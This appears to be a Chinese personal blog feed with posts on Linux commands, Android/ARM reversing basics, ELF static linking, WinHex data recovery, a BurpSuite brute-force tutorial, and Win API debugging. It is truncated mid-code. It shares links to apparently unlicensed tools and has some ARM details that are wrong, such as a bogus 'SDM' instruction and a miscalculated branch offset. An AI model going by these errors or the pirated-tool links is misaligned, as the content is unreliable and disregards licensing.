(/proc下面的有很多系统信息)<br>　　<em> 打印文件系统空间使用情况: df -h　　</em> 查看硬盘分区情况: fdisk -l<br>　　<em> 产看文件大小: du -h filename;　　</em> 查看目录大小： du -hs dirname ; du -h dirname是查看目录下所有文件的大小<br>　　<em> 查看内存的使用： free -m|-g|-k　　</em> 查看进程： ps -e 或ps -aux –&gt;显示用户<br>　　<em> 杀掉进程: kill pid　　</em> 强制杀掉： killall -9 processname</li><li>网络相关：<br>　　<em> 配置 ADSL: sudo pppoeconf　　</em> ADSL手工拨号: sudo pon dsl-provider<br>　　<em> 激活 ADSL : sudo /etc/ppp/pppoe_on_boot　　</em> 断开 ADSL: sudo poff<br>　　<em> 根据IP查网卡地址: arping IP地址　　</em> 产看本地网络信息（包括ip等）: ifconfig | ifconfig eth0<br>　　<em> 查看路由信息: netstat -r　　</em> 关闭网卡： sudo ifconfig eth0 down<br>　　<em> 启用网卡： sudo ifconfig eth0 up　　</em> 添加一个服务: sudo update-rc.d 服务名 defaults 99<br>　　<em> 删除一个服务: sudo update-rc.d 服务名 remove　　</em> 临时重启一个服务: /etc/init.d/服务名 restart<br>　　<em> 临时关闭一个服务: /etc/init.d/服务名 stop　　</em> 临时启动一个服务: /etc/init.d/服务名 start<br>　　<em> 控制台下显示中文: sudo apt-get install zhcon　　</em> 查找某个文件: whereis filename 或 find 目录 -name 文件名<br>　　*通过ssh传输文件<br>　　scp -rp /path/filename username@remoteIP:/path #将本地文件拷贝到服务器上<br>　　scp -rp username@remoteIP:/path/filename /path #将远程文件从服务器下载到本地</li><li>压缩:<br>　　<em>解压缩 a.tar.gz: tar zxvf a.tar.gz　　</em>解压缩 a.tar.bz2: tar jxvf a.tar.bz2<br>　　<em>压缩aaa bbb目录为xxx.tar.gz: tar zcvf xxx.tar.gz aaa bbb　　</em>压缩aaa bbb目录为xxx.tar.bz2: tar jcvf xxx.tar.bz2 aaa bbb[6] </li><li>Nautilus：<br>　　特殊 URI 地址<br>　　<em> computer:/// - 全部挂载的设备和网络　　</em> network:/// - 浏览可用的网络<br>　　<em> burn:/// - 一个刻录 CDs/DVDs 的数据虚拟目录　　</em> smb:/// - 可用的 windows/samba 网络资源<br>　　<em> x-nautilus-desktop:/// - 桌面项目和图标　　</em> file:/// - 本地文件<br>　　<em> trash:/// - 本地回收站目录　　</em> ftp:// - FTP 文件夹<br>　　<em> ssh:// - SSH 文件夹　　</em> fonts:/// - 字体文件夹，可将字体文件拖到此处以完成安装<br>　　<em> themes:/// - 系统主题文件夹　　</em> 显示隐藏文件: Ctrl+h<br>　　<em> 显示地址栏: Ctrl+l　　</em> 查看已安装字体: 在nautilus的地址栏里输入”fonts:///“，就可以查看本机所有的fonts[6]<br>7.补充部分：</li></ol><ul><li>查看本地所有的tpc,udp监听端口: netstat -tupln (t=tcp, u=udp, p=program, l=listen, n=numric)<br>　　<em> 通过man搜说相关命令: man -k keyword . eg: man -k user　　</em> 或者用 apropos<br>　　<em> 统计文件所占用的实际磁盘空间： du (du - estimate file space usage)　　</em> 统计文件中的字符，字节数: wc -c/-l/-w (wc - print the number of newlines, words, and bytes in files)<br>　　<em> 查看文件的内容： od -x/-c/…. (od - dump files in octal and other formats)<br>　　我认为od最有用的就是文件的字节流了: od -t x1 filename<br>　　查看文件的 Ascii 码形式: od -t c filename (其中统计信息最左边的是： 字节数)　　</em> 查找命令所在文件的位置： which od 输出： /usr/bin/od<br>　　查看该文件由哪个包提供： dpkg -S /usr/bin/od 输出: coreutils: /usr/bin/od<br>　　再查看coreutils包的全部内容就知道了linux的核心命令: dpkg -L coreutils<br>　　然后 info coreutils 哈哈，认真学吧， 满世界都是命令!<br>　　<em> 可以用man 命令产看某个命令的所有section 的解释: man -a tty<br>　　然后用q,和next 转换到下一个section的解释　　</em> bash 的好用的快捷键:<br>　　ctrl+a:光标移到行首。<br>　　ctrl+b:光标左移一个字母<br>　　ctrl+c:杀死当前进程。<br>　　ctrl+d:退出当前 Shell。<br>　　ctrl+e:光标移到行尾。<br>　　ctrl+h:删除光标前一个字符，同 backspace 键相同。<br>　　ctrl+k:清除光标后至行尾的内容。<br>　　ctrl+l:清屏，相当于clear。<br>　　ctrl+r:搜索之前打过的命令。会有一个提示，根据你输入的关键字进行搜索bash的history<br>　　ctrl+u: 清除光标前至行首间的所有内容。<br>　　ctrl+w: 移除光标前的一个单词<br>　　ctrl+t: 交换光标位置前的两个字符<br>　　ctrl+y: 粘贴或者恢复上次的删除<br>　　ctrl+d: 删除光标所在字母;注意和backspace以及ctrl+h的区别，这2个是删除光标前的字符<br>　　ctrl+f: 光标右移<br>　　ctrl+z : 把当前进程转到后台运行，使用’ fg ‘命令恢复。比如top -d1 然后ctrl+z ，到后台，然后fg,重新恢复<br>　　<em> 快速粘贴：先在一个地方选中文字，在欲粘贴的地方按鼠标 中键 即可。　　</em> 等效中键：a 、按下滑轮等效于中键。b、同时按下鼠标 左右键，等效于中键。<br>　　<em> 快速重启X服务： 同时按下： Alt + Ctrl + Backspace 三个键。　　</em> 打开”运行”窗口： 同时按下 Alt + F2 键。<br>　　<em> 戴屏： a、全屏：直接按下 PrtScr 键。<br>　　b、当前窗口：同时按下 Alt + PrtScr 键。<br>　　c、延时戴屏：在 终端 或 “运行”窗口中输入命令： gnome-screenshot –delay 3 ，将延时 3 秒后戴屏。　　</em> 直接将 文件管理器 中的文件拖到 GNOME终端 中就可以在终端中得到完整的路径名。[6]  8.ulimit<br>　　ulimit：显示（或设置）用户可以使用的资源的限制（limit），这限制分为软限制（当前限制）和硬限制（上限），其中硬限制是软限制的上限值，应用程序在运行过程中使用的系统资源不超过相应的软限制，任何的超越都导致进程的终止。<br>　　ulimited 不限制用户可以使用的资源，但本设置对可打开的最大文件数（max open files）<br>　　和可同时运行的最大进程数（max user processes）无效<br>　　-a 列出所有当前资源极限<br>　　-c 设置core文件的最大值.单位:blocks<br>　　-d 设置一个进程的数据段的最大值.单位:kbytes<br>　　-f Shell 创建文件的文件大小的最大值，单位：blocks<br>　　-h 指定设置某个给定资源的硬极限。如果用户拥有 root 用户权限，可以增大硬极限。任何用户均可减少硬极限<br>　　-l 可以锁住的物理内存的最大值<br>　　-m 可以使用的常驻内存的最大值,单位：kbytes<br>　　-n 每个进程可以同时打开的最大文件数<br>　　-p 设置管道的最大值，单位为block，1block=512bytes<br>　　-s 指定堆栈的最大值：单位：kbytes<br>　　-S 指定为给定的资源设置软极限。软极限可增大到硬极限的值。如果 -H 和 -S 标志均未指定，极限适用于以上二者<br>　　-t 指定每个进程所使用的秒数,单位：seconds<br>　　-u 可以运行的最大并发进程数<br>　　-v Shell可使用的最大的虚拟内存，单位：kbytes<br>　　eg: ulimit -c 1000(可以先通过ulimit -c 查看原来的值)</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;由于Android是基于liunx内核的，今天整理一下liunx的有关信息&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Android_逆向</title>
    <link href="http://yoursite.com/2018/03/08/android_re_1/"/>
    <id>http://yoursite.com/2018/03/08/android_re_1/</id>
    <published>2018-03-08T05:30:56.623Z</published>
    <updated>2018-03-10T01:00:30.002Z</updated>
    
    <content type="html"><![CDATA[<p>以前打比赛的时候就是我负责Android题目的，以后就主要学习Android啦，顺便上传一些工具，IDA7.0(可支持64位f5反编译哦)等<br><a id="more"></a><br>工具链接：<a href="https://pan.baidu.com/s/1poQEL-RlQgqRLhnfzozbpw" target="_blank" rel="external">https://pan.baidu.com/s/1poQEL-RlQgqRLhnfzozbpw</a> 密码：n6bp</p><h2 id="1、Android"><a href="#1、Android" class="headerlink" title="1、Android"></a>1、Android</h2><p>Android是基于liunx内核的，我们简单看一个hello world的执行过程<br><img src="https://i.imgur.com/NDYNZen.png" alt=""></p><h2 id="2、Android相关的语言"><a href="#2、Android相关的语言" class="headerlink" title="2、Android相关的语言"></a>2、Android相关的语言</h2><p>Java:开发安卓SDK的软件<br>smali:安卓的反汇编语言<br>c/c++:开发安卓NDK的软件，也就是包括so<br>Python:开发脚本插件，开发IDA脚本<br>C#:Unity3d游戏开发<br>Lua:重要的脚本插件或中间语言，在游戏中实用很多<br>JS:开发用于和服务器协议算法相关</p><h2 id="3、ARM汇编基础知识"><a href="#3、ARM汇编基础知识" class="headerlink" title="3、ARM汇编基础知识"></a>3、ARM汇编基础知识</h2><h3 id="1、初识ARM"><a href="#1、初识ARM" class="headerlink" title="1、初识ARM"></a>1、初识ARM</h3><p>Intel8086是英特尔公司的16位处理器，ARM是ARM公司的32位处理器。每个处理器都对应自己的一套汇编语言，所以两个处理器分别对应于8086汇编和ARM汇编。由于处理器的位数，所以8086汇编指令的机器码是16位，而ARM汇编指令的机器码就是32位。机器码可以看作是二进制指令，其实所谓的HEX即称为十六进制操作码或十六进制机器码，也是二进制指令，只是把二进制的数值用十六进制去展示。，如果你会了ARM，就会了主流的嵌入式开发，然后就是硬件编程，然后就是机器人或机械制造。所以,ARM真的非常重要，希望可以去认真学习，不仅是ARM指令集，还有ARM的机器码的原理，以及ELF文件在linux下的objdump反编译。ARM机器码32位，我们以跳转指令BEQ指令为例讲解汇编指令的机器码。</p><p>31-28位，Cond<br>27-25位，101,B指令标识<br>25-24位，Link<br>23-0位，Offset,跳转处与当前指令差值</p><p>例：<br>00001BD0 BRQ loc_1C04<br>Cond:0000,表示EQ<br>101,B系列指令固定标识<br>L:0,表示不需要保存下一条指令<br>Offset:该值位0x1C04-0x1BD0=0000 0000 0000 0000 0000 1011<br>整体为：0000 1010 0000 0000 0000 0000 0000 1011<br>        Cond B+Link        Offset<br>0A 00 00 0B<br>再根据汇编倒序特点,显示为0B 00 00 0A</p><h3 id="2、ARM与Thumb、Thunmb2指令"><a href="#2、ARM与Thumb、Thunmb2指令" class="headerlink" title="2、ARM与Thumb、Thunmb2指令"></a>2、ARM与Thumb、Thunmb2指令</h3><p>当我们把SO里的汇编语言放到工具中去转换为HEX时，会发现和IDA中的HEX有时是完全不同的，这是因为IDA中有时反编译SO使用的不是ARM，而是16位的ARM，也就是Thumb指令，但有时却是ARM的32位指令。其实对于指令集的判断应该看机器码，当机器码第5位statebit值位1为Thumb指令集，当为0时位ARM指令集。Thunmb2指令为32位，只有当15-13位为111,12-11位不为00的情况下才是。如同beq,bne这两个汇编指令，用ARM的4个HEX表示时，其实HEX的值位0A,1A,而当用2个HEX数表示时，其HEX值为D0,D1。有时候动态调试的时候需要手工IDA转为Thumb指令</p><h3 id="3、ARM的寄存器"><a href="#3、ARM的寄存器" class="headerlink" title="3、ARM的寄存器"></a>3、ARM的寄存器</h3><p>首先以标准ARM指令来看，有R0-R15个寄存器<br>R0-R7:通用寄存器<br>R8-R10:不通用寄存器<br>R15:程序计数器(PC)，相当重要的一个寄存器，可以实现地址跳转，记的不是数，而是地址，直接关系着系统中断<br>R13:堆栈指针(SP)<br>R14:链接寄存器(LR)<br>R11:基址指针(FP)<br>R12:暂时寄存器(IP)<br>CPSR:状态寄存器</p><h3 id="4、ARM的指令"><a href="#4、ARM的指令" class="headerlink" title="4、ARM的指令"></a>4、ARM的指令</h3><p>CMP:比较<br>CMP R0,#0  (R0寄存器中的值与0比较 标志位z=0,表示相等，在动态调试中可以看到)</p><p>LDR: 从存储器中加载数据到寄存器 &lt;–Load<br>LDR R0,[R9,#04] 将R9+0x04指向存储单元的值赋给R0</p><p>STR: 将寄存器的数据存储到存储器 –&gt; Store<br>STR R0,[R9,#04] R0的值存储到R9+0x04指向存储单元</p><p>LDM: 将寄存器的数据加载到一个寄存器列表<br>LDM R0,{R1-R3} 将R0的数据依次加载到R1,R2,R3寄存器</p><p>SDM: 一个寄存器列表的数据存储到指定寄存器<br>SDM R0,{R1-R3}</p><p>PUSH: 将寄存器值压入堆栈中<br>POP:  将堆栈中的数据推出到寄存器</p><p>ADD,SUB,MUL,DIV 加减乘除</p><p>AND,ORR,EOR 与，或，异或</p><p>LSL 逻辑左移<br>LSR 逻辑右移</p><p>LSL R0,R1,#2  R0=R1*4</p><h3 id="5、ARM寻址方式"><a href="#5、ARM寻址方式" class="headerlink" title="5、ARM寻址方式"></a>5、ARM寻址方式</h3><p>1). 寄存器：    MOV R1,R2 ; R2-&gt;R1<br>2). 立即数：    SUBS R0,R1,#1; R0=R1-1<br>3). 寄存器移位：MOV R0,R2,LSL #3 ;R2左移三位-&gt;R0<br>4). 间接寻址：  LDR R1,[R2] ; 装载R2指向的内存数值至R1<br>5). 基址寻址：  LDR R2,[R3,#0x0F] ;R3+0x0F作为地址，将所</p><h3 id="6、函数传参"><a href="#6、函数传参" class="headerlink" title="6、函数传参"></a>6、函数传参</h3><p>一般从R0-R3,多于4个参数便会压入栈中</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;以前打比赛的时候就是我负责Android题目的，以后就主要学习Android啦，顺便上传一些工具，IDA7.0(可支持64位f5反编译哦)等&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>静态编译linux的ELF文件</title>
    <link href="http://yoursite.com/2018/03/08/re_elf_static/"/>
    <id>http://yoursite.com/2018/03/08/re_elf_static/</id>
    <published>2018-03-08T01:51:03.295Z</published>
    <updated>2018-03-08T03:57:22.645Z</updated>
    
    <content type="html"><![CDATA[<p>程序员自我修养第4章——静态编译<br><a id="more"></a></p><h1 id="1、什么是静态编译"><a href="#1、什么是静态编译" class="headerlink" title="1、什么是静态编译"></a>1、什么是静态编译</h1><p>静态编译，就是编译器在编译可执行文件的时候，将可执行文件需要调用的对应动态链接库(.so或.lib)中的部分提取出来，链接到可执行文件中去，使可执行文件在运行的时候不依赖于动态链接库。</p><h1 id="2、实验"><a href="#2、实验" class="headerlink" title="2、实验"></a>2、实验</h1><p>这里有a.c,b.c两个文件，如下:<br>b.c<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> shared=<span class="number">1</span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> *a,<span class="keyword">int</span> *b)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">*a^=*b^=*a^=*b;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>a.c<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">extern</span> <span class="keyword">int</span> shared;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> a=<span class="number">100</span>;</div><div class="line">swap(&amp;a,&amp;shared);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>通过编译<code>gcc -c a.c b.c</code>产生a.o,b.o两个目标文件，接着我们准备把a.o,b.o文件合并ab文件。这里有两种方法。</p><h2 id="一种是按序叠加-直接将一个文件加在另一个文件的尾，并依此合并-。"><a href="#一种是按序叠加-直接将一个文件加在另一个文件的尾，并依此合并-。" class="headerlink" title="一种是按序叠加(直接将一个文件加在另一个文件的尾，并依此合并)。"></a>一种是<code>按序叠加</code>(直接将一个文件加在另一个文件的尾，并依此合并)。</h2><h2 id="一种是相似段合并-将相同性质的段合并到一起，如text段合并到text段-，又称为两步链接法。"><a href="#一种是相似段合并-将相同性质的段合并到一起，如text段合并到text段-，又称为两步链接法。" class="headerlink" title="一种是相似段合并(将相同性质的段合并到一起，如text段合并到text段)，又称为两步链接法。"></a>一种是<code>相似段合并</code>(将相同性质的段合并到一起，如text段合并到text段)，又称为<code>两步链接法</code>。</h2><p>这里我们采用第二种方法进行链接(链接器为目标文件分配地址和空间)</p><h3 id="第一步-空间与地址分配"><a href="#第一步-空间与地址分配" class="headerlink" title="第一步 空间与地址分配"></a>第一步 空间与地址分配</h3><p>扫描所有的输入文件，获取他们的各个段的长度，属性和位置，并且将输入目标文件的符号表中所有的符号定义和符号引用收集起来，同意放到一个全局符号表，并建立映射关系。</p><h3 id="第二步-符号解析与重定位"><a href="#第二步-符号解析与重定位" class="headerlink" title="第二步 符号解析与重定位"></a>第二步 符号解析与重定位</h3><p>使用上面收集的所有信息，读取输入文件中断的数据，重定位信息，并且进行符号解析与重定位，调整代码中的地址等。这一步中核心是重定位过程。<br>我们使用ld链接器将<code>a.o</code>和<code>b.o</code>链接起来。<br><code>ld a.o b.o -e main -o ab</code><br>-e main 表示将main函数作为程序的入口地址，ld链接器默认的程序入口地址是_start.<br>-o ab 表示链接输出文件名为ab，默认为a.out<br><img src="https://i.imgur.com/CcjDrqB.png" alt=""><br><img src="https://i.imgur.com/VBcjd4b.png" alt=""><br>上图中VMA(Vitual Meemory Address)虚拟地址，LMA(load Memory Address)加载地址，正常情况下这两个是一样的，但是在一些嵌入式系统中，特别是在哪些程序放在ROM的系统中，它们是不同的。</p><h3 id="符号地址的确定"><a href="#符号地址的确定" class="headerlink" title="符号地址的确定"></a>符号地址的确定</h3><p>当完成前面一步时，链接器开始计算各个符号的虚拟地址，因为各个符号在段内的相对位置是固定的，所有这个时候<code>main</code>,<code>shared</code>的地址已经确认啦(只需要每一个符号加上一个偏移，就能找到正确的虚拟地址)。</p><h3 id="符号解析和重定位"><a href="#符号解析和重定位" class="headerlink" title="符号解析和重定位"></a>符号解析和重定位</h3><h4 id="重定位"><a href="#重定位" class="headerlink" title="重定位"></a>重定位</h4><p>我们用<code>objdump -d a.o</code><br><img src="https://i.imgur.com/b7qqXAH.png" alt=""><br>可以看到shared的地址是0，因为这里不知道的位置。swap也是一样的。我们再看看ab<br><code>objdunp -d ab</code><br><img src="https://i.imgur.com/gIQHS6j.png" alt=""><br>发现链接后能正确的找到符号地址</p><h4 id="重定位修正方法"><a href="#重定位修正方法" class="headerlink" title="重定位修正方法"></a>重定位修正方法</h4><p>对于Intel x86处理器，有两种类型的处理器，分布的修正方法<br>A = 保存在修正位置的值<br>S = 符号的实际地址<br>P = 被修正过的位置(相对于段开始的偏移量或是虚拟地址)</p><p>1、R_386_32 绝对寻址修正 S+A<br>2、R_386_PC32 相对寻址修正 S+A-P</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;程序员自我修养第4章——静态编译&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>数据恢复</title>
    <link href="http://yoursite.com/2018/03/07/data_recovery/"/>
    <id>http://yoursite.com/2018/03/07/data_recovery/</id>
    <published>2018-03-07T00:29:17.784Z</published>
    <updated>2018-03-07T04:22:05.370Z</updated>
    
    <content type="html"><![CDATA[<p>数据恢复分类：硬恢复和软恢复。<br><a id="more"></a></p><h1 id="一、硬恢复"><a href="#一、硬恢复" class="headerlink" title="一、硬恢复"></a>一、硬恢复</h1><p>所谓硬恢复就是硬盘出现物理性损伤，比如有盘体坏道、电路板芯片烧毁、盘体异响等故障，由此所导致的普通用户不容易取出里面数据，那么我们将它修好，同时又保留里面的数据或后来恢复里面的数据，这些都叫数据恢复，只不过这些故障有容易的和困难的之分。</p><h1 id="二、软恢复"><a href="#二、软恢复" class="headerlink" title="二、软恢复"></a>二、软恢复</h1><p>所谓软恢复，就是硬盘本身没有物理损伤，而是由于人为或者病毒破坏所造成的数据丢失（比如误格式化，误分区），那么这样的数据恢复就叫软恢复。</p><h2 id="1、FAT"><a href="#1、FAT" class="headerlink" title="1、FAT"></a>1、FAT</h2><p>FAT文件系统的基本结构依次为：DBR扇区、FAT表1、FAT表2、根目录和数据区。<br>如图:<br><img src="https://i.imgur.com/bgX4ERU.png" alt=""><br>我们可以用winhex工具来打开一个SD卡(磁盘，这里可以用RAMDisk来创建一个虚拟磁盘)，如图:<br><img src="https://i.imgur.com/zTbHdTU.png" alt=""><br>这里可以根据模板来看每个字节代表的意思(如果不能使用模板，那就还没有激活，这里附带全部工具。链接：<a href="https://pan.baidu.com/s/1AheJMibnDhikoUVZrqIgDg" target="_blank" rel="external">https://pan.baidu.com/s/1AheJMibnDhikoUVZrqIgDg</a> 密码：7hyd)。</p><h2 id="2、文件恢复"><a href="#2、文件恢复" class="headerlink" title="2、文件恢复"></a>2、文件恢复</h2><p>使用WinHex 恢复被破坏的文件<br>用winhex打开磁盘，选择磁盘快照，然后创建一个文件，再删除文件，再次用winhex打开磁盘，就会发现刚才删除的文件，选择恢复文件(为了避免数据丢失，应该恢复到其他磁盘)，再次打开文件，发现文件恢复。如下图演示:<br><img src="https://i.imgur.com/iIKAhWi.png" alt=""><br><img src="https://i.imgur.com/MOrVj10.png" alt=""><br><img src="https://i.imgur.com/nfr90MH.png" alt=""><br><img src="https://i.imgur.com/T5i92Ak.png" alt=""><br><img src="https://i.imgur.com/QOeAArm.png" alt=""><br>接着测试NTFS的磁盘，发现并不不能恢复，呀呀呀呀（可能是自己太菜啦）。然后在网上找一下，发现一个恢复文件的工具很好用，专业还是专业的好，我就了解一下，好好学习。<a href="http://www.jjhuifu.com/jj/brj.html" target="_blank" rel="external">http://www.jjhuifu.com/jj/brj.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;数据恢复分类：硬恢复和软恢复。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>BurpSuite从安装到&quot;放弃&quot;</title>
    <link href="http://yoursite.com/2018/01/29/web_bp/"/>
    <id>http://yoursite.com/2018/01/29/web_bp/</id>
    <published>2018-01-29T05:18:04.339Z</published>
    <updated>2018-03-07T14:51:42.617Z</updated>
    
    <content type="html"><![CDATA[<p>以前也用过这个工具，不过没有好好的用，很多功能还不是很了解，现在嘛，发现它真的是个神器，好好的学习(其实为了以后找工作，毕竟以后还是会用到这个的呀)，<br><a id="more"></a></p><h1 id="一、BurpSuite是啥"><a href="#一、BurpSuite是啥" class="headerlink" title="一、BurpSuite是啥"></a>一、BurpSuite是啥</h1><p>如果你是打过ctf比赛的，那下面这段直接跳过。它由Java语言编写，是一个集成化的渗透测试工具，它集合了多种渗透测试组件，使我们自动化地或手工地能更好的完成对web应用的渗透测试和攻击。</p><h2 id="常用的功能：抓包、重放、爆破"><a href="#常用的功能：抓包、重放、爆破" class="headerlink" title="常用的功能：抓包、重放、爆破"></a>常用的功能：抓包、重放、爆破</h2><h1 id="二、安装BurpSuite"><a href="#二、安装BurpSuite" class="headerlink" title="二、安装BurpSuite"></a>二、安装BurpSuite</h1><h2 id="1-、首先你的电脑上有java环境，然后下载BurpSuite"><a href="#1-、首先你的电脑上有java环境，然后下载BurpSuite" class="headerlink" title="(1)、首先你的电脑上有java环境，然后下载BurpSuite"></a>(1)、首先你的电脑上有java环境，然后下载BurpSuite</h2><p>在命令控制端输入java,如果是这样，就有java环境，否则自己去安装吧。<br><img src="https://i.imgur.com/qgJuZgp.png" alt=""><br>下载Bp<br>链接：<a href="https://pan.baidu.com/s/10Jq0P5n67VdIZuNZLgj2SQ" target="_blank" rel="external">https://pan.baidu.com/s/10Jq0P5n67VdIZuNZLgj2SQ</a> 密码：rc69</p><h2 id="2-、向浏览器中导入证书"><a href="#2-、向浏览器中导入证书" class="headerlink" title="(2)、向浏览器中导入证书"></a>(2)、向浏览器中导入证书</h2><p>向bp中导入证书<br><img src="https://i.imgur.com/WsAHe0R.png" alt=""><br><img src="https://i.imgur.com/JMqKwA3.png" alt=""><br><img src="https://i.imgur.com/yV1IvtF.png" alt=""><br>向浏览器中导入证书<br><img src="https://i.imgur.com/nwP1HfW.png" alt=""><br><img src="https://i.imgur.com/6z8OAOQ.png" alt=""></p><h2 id="3-、运行，截断流量成功"><a href="#3-、运行，截断流量成功" class="headerlink" title="(3)、运行，截断流量成功"></a>(3)、运行，截断流量成功</h2><p><img src="https://i.imgur.com/TfkzHVJ.png" alt=""><br><img src="https://i.imgur.com/u01CBgq.png" alt=""></p><h1 id="三、功能介绍"><a href="#三、功能介绍" class="headerlink" title="三、功能介绍"></a>三、功能介绍</h1><h2 id="1、Proxy-代理-，提供一个直观、友好的用户界面，他的代理服务器包含非常详细的拦截规则，并能准确分析HTTP-消息的结构与内容"><a href="#1、Proxy-代理-，提供一个直观、友好的用户界面，他的代理服务器包含非常详细的拦截规则，并能准确分析HTTP-消息的结构与内容" class="headerlink" title="1、Proxy(代理)，提供一个直观、友好的用户界面，他的代理服务器包含非常详细的拦截规则，并能准确分析HTTP 消息的结构与内容"></a>1、Proxy(代理)，提供一个直观、友好的用户界面，他的代理服务器包含非常详细的拦截规则，并能准确分析HTTP 消息的结构与内容</h2><p>选项Intercept<br><img src="https://i.imgur.com/4MNx4YP.png" alt=""><br>选项option<br><img src="https://i.imgur.com/XfBr0dN.png" alt=""></p><h2 id="2、Intruder-爆破-，定制攻击自动化"><a href="#2、Intruder-爆破-，定制攻击自动化" class="headerlink" title="2、Intruder(爆破)，定制攻击自动化"></a>2、Intruder(爆破)，定制攻击自动化</h2><p>抓包发送到Intruder处<br><img src="https://i.imgur.com/ScC0zjg.png" alt=""><br>工具已经自动为我们创造了有效载荷测试的位置。有效载荷的位置使用§符号作为每个有针对性的攻击位置的起始和结束标记。你想测试的位置前后用§§符号进行标示。然后设置攻击类型<br>Sniper 这种攻击模式可以让我们选择的攻击位置注入一个单一的有效载荷。<br>Pitchfork 这种攻击模式允许你测试多种有效载荷，最大能够自定义8 个，基于攻击位置<br>Cluster bomb 这种攻击模式使用多种有效载荷，并允许你测试每一个可能有效载荷在每个选择的攻击位置，这意味着接下来的测试，交换任何其他有效载荷。当你有不同需要注射的地方，它将会非常的方便。<br><img src="https://i.imgur.com/82tMppA.png" alt=""><br><img src="https://i.imgur.com/1flpjdv.png" alt=""><br><img src="https://i.imgur.com/kdyDg9s.png" alt=""><br><img src="https://i.imgur.com/yicYuFW.png" alt=""><br><img src="https://i.imgur.com/Uhu3Mx3.png" alt=""><br><img src="https://i.imgur.com/pgZUCbH.png" alt=""><br><img src="https://i.imgur.com/ln6ud1a.png" alt=""><br><img src="https://i.imgur.com/3t14eDJ.png" alt=""><br><img src="https://i.imgur.com/4kMNdpE.png" alt=""></p><h2 id="3、Scanner-Web-应用程序的安全漏洞进行自动发现工具。它被设计用于渗透测试，并密切与您现有的技术和方法，以适应执行手动和半自动化的Web-应用程序渗透测试。"><a href="#3、Scanner-Web-应用程序的安全漏洞进行自动发现工具。它被设计用于渗透测试，并密切与您现有的技术和方法，以适应执行手动和半自动化的Web-应用程序渗透测试。" class="headerlink" title="3、Scanner  Web 应用程序的安全漏洞进行自动发现工具。它被设计用于渗透测试，并密切与您现有的技术和方法，以适应执行手动和半自动化的Web 应用程序渗透测试。"></a>3、Scanner  Web 应用程序的安全漏洞进行自动发现工具。它被设计用于渗透测试，并密切与您现有的技术和方法，以适应执行手动和半自动化的Web 应用程序渗透测试。</h2><p>参考这个链接:<a href="https://bbs.ichunqiu.com/thread-16260-1-1.html" target="_blank" rel="external">https://bbs.ichunqiu.com/thread-16260-1-1.html</a></p><h2 id="4、Repeater-重放"><a href="#4、Repeater-重放" class="headerlink" title="4、Repeater(重放)"></a>4、Repeater(重放)</h2><p>手工修改，可以不断重放，如下:<br><img src="https://i.imgur.com/4cgA3Z4.png" alt=""></p><h2 id="5、Decoder-解密"><a href="#5、Decoder-解密" class="headerlink" title="5、Decoder(解密)"></a>5、Decoder(解密)</h2><p>用于普通解密，hash<br><img src="https://i.imgur.com/31NPqMZ.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;以前也用过这个工具，不过没有好好的用，很多功能还不是很了解，现在嘛，发现它真的是个神器，好好的学习(其实为了以后找工作，毕竟以后还是会用到这个的呀)，&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>加密与解密——调试篇</title>
    <link href="http://yoursite.com/2017/12/31/encode_and_decode_debug/"/>
    <id>http://yoursite.com/2017/12/31/encode_and_decode_debug/</id>
    <published>2017-12-31T02:42:04.425Z</published>
    <updated>2017-12-31T03:32:47.365Z</updated>
    
    <content type="html"><![CDATA[<p>迟迟没有学习的加密与解密，现在开始吧<br><a id="more"></a></p><h1 id="一、Win-API简介"><a href="#一、Win-API简介" class="headerlink" title="一、Win API简介"></a>一、Win API简介</h1><p>API(Application Programming Interface)应用程序编程接口。在早期，windows的主要部分只需要三个动态链接库中实现，这代表了windows三个主要子系统——Kernel,User和GDI.<br>Kernel:操作系统的核心功能服务，包括进程与线程控制，内存管理，文件访问等。<br>User:负责处理用户接口，包括键盘和鼠标输入，窗口和菜单管理等。<br>GDI:图形设备接口，允许程序在屏幕上和打印机上显示文本和图像。</p><h1 id="二、常用的Win32-API函数"><a href="#二、常用的Win32-API函数" class="headerlink" title="二、常用的Win32 API函数"></a>二、常用的Win32 API函数</h1><h2 id="1、GetWindowText函数"><a href="#1、GetWindowText函数" class="headerlink" title="1、GetWindowText函数"></a>1、GetWindowText函数</h2><p>此函数在USER32.DLL用户模块中，它的作用是取得一个窗体的标题文字，或者一个文本控件的内容。<br>函数原型：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetWindowText</span><span class="params">(</span></span></div><div class="line"><span class="function"><span class="params">HWND hwnd,  <span class="comment">//窗口或文本控件句柄</span></span></span></div><div class="line"><span class="function"><span class="params">LPTSTR lpString,<span class="comment">//缓冲区地址</span></span></span></div><div class="line"><span class="function"><span class="params"><span class="keyword">int</span> nMaxCount<span class="comment">//复制的最大字符数</span></span></span></div><div class="line"><span class="function"><span 